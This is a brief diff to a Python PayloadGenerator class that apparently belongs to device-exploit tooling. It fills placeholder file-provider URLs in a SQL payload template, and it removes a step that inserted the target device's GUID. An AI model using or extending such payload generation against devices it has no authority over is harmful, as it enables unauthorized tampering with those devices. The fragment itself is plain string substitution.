@@ -317,9 +317,6 @@ class PayloadGenerator:
             dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=blwal', wal_url)
             dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=itunes', meta_url)
             
-            # Replace the template GUID with our device's GUID
-            dl_sql_content = dl_sql_content.replace('3DBBBC39-F5BA-4333-B40C-6996DE48F91C', guid)
-            
             # Legacy fallbacks (keep for compatibility)
             dl_sql_content = dl_sql_content.replace('URL_METADATA', meta_url)
             dl_sql_content = dl_sql_content.replace('URL_WAL', wal_url)
